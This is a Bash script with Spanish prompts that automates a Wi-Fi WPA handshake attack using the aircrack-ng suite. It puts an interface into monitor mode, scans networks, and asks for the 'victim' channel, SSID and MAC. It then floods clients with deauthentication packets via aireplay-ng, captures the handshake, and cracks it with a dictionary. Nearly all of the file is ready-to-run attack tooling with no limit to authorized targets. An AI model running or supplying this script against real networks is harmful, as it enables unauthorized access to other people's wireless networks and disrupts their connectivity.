#!/bin/bash
clear
figlet handshake automation
echo "Escrito por: mmaganadebia."
echo ""
read -p "Hola $USER, ¿Quieres comenzar? (si / no): " firstDecision

ifaces=$(ip link | grep -E "^[0-9]+" | cut -d ':' -f 2 | awk '{print $1}' | grep -E "^lo$" -v)

invalid_iface_selected(){
  select_interface
}

select_interface(){
option_counter=0
	for item in ${ifaces}; do
		option_counter=$((option_counter + 1))
		if [ ${#option_counter} -eq 1 ]; then
			spaceiface="  "
		else
			spaceiface="  "
		fi
		echo -ne "${option_counter}.${spaceiface}${item}  "
	
	if [ "" = "" ]; then
        echo ""	
	fi
	done

	read -rp "Seleccione una interfaz: " iface
	if [[ ! ${iface} =~ ^[[:digit:]]+$ ]] || (( iface < 1 || iface > option_counter )); then
		invalid_iface_selected
	else
		option_counter2=0
		for item2 in ${ifaces}; do
			option_counter2=$((option_counter2 + 1))
			if [[ "${iface}" = "${option_counter2}" ]]; then
				interface=${item2}
				break
			fi
		done
    fi
  }


firstTerminal(){
  xterm -hold -e sudo airodump-ng -c $canal --bssid $mac --write $red "$interface"'mon' &
}

aircrackInstall(){
  read -p "¿Quieres instalar aircrack-ng? Es necesaria (si/no)" aircrackDecision
  case $aircrackDecision in
    si)
      sudo apt-get install aircrack-ng
      ;;
    no)
     echo "Saliendo del script..."
  esac
}

figletInstall(){
  read -p "¿Quieres instalar fliglet? solo es para el banner (si / no)" figletDecision
  case $figletDecision  in
    si)
      sudo apt-get install figlet
      ;;
    no)
      echo "Correcto..."
  esac
}

verifTools(){
  sudo dpkg -l aircrack-ng &> /dev/null && echo "aircrack-ng instalada..." || aircrackInstall
  sudo dpkg -l figlet &> /dev/null && echo "figlet instalado..." || figletInstall
}

deauthentication(){
  read -p "¿Quieres enviar otro ataque de desautenticación? (si / no) " deauth
  case $deauth in
    si)
      sudo aireplay-ng -0 10 -a $mac  -e $red "$interface"'mon'
      deauthentication
      ;;
    no)
      dictionariOrSave
esac
}

dictionariOrSave(){
  read -p "¿Quieres intentar decifrar con un diccionario o guardar el handshake? [ D(diccionario) / G(guardar) ] " doc
  case $doc in
    D)
      read -p "Escribe la ruta del diccionario: " diccionario
      xterm -hold -e sudo aircrack-ng "$red"'-01.cap' -w "$diccionario" &
      sudo service NetworkManager start
      sudo airmon-ng stop "$interface"'mon'
      exit
     ;;
    G)
      read -p "¿Quieres eliminar los archivos residuales? (si / no) " residual_files_desicion
      residual_files
       esac
}

residual_files(){
  case $residual_files_desicion in
    si)
      echo "Eliminando archivos residuales..."
      sudo rm  $red"-01.csv"
      sudo rm $red"-01.kismet.csv"
      sudo rm $red"-01.kismet.netxml"
      sudo rm $red"-01.log.csv"
      echo "Saliendo..."
      sleep 2s
      sudo service NetworkManager start
      sudo airmon-ng stop "$interface"'mon'
      ;;
    no)
      echo "Saliendo..."
      sleep 2s
      sudo service NetworkManager start
      sudo airmon-ng stop "$interface"'mon'
      exit
  esac
}

case $firstDecision in
  si)
    echo "Verificando herramientas instaladas"
    verifTools
    echo "Comenzando..."
    echo "Matando procesos que pueden interferir..."
    sudo airmon-ng check kill
    select_interface
    echo "Poniendo interfaz en modo monitor..."
    sudo airmon-ng start $interface
    echo "Escaneando redes..."
    echo "Puedes detener el escaneo cuando quieras con ctrl +c"
    sleep 5s
    sudo airodump-ng "$interface"'mon'
    read -p "Canal de la victima: " canal
    read -p "Nombre de la red: " red
    read -p "Direccion MAC: " mac
    firstTerminal 
    sleep 5s 
    sudo aireplay-ng -0 10 -a $mac  -e $red "$interface"'mon'
    deauthentication
    ;;
  no)
    echo "Saliendo del script."
    echo "¡Adios!"
    sleep 2s
    exit
esac
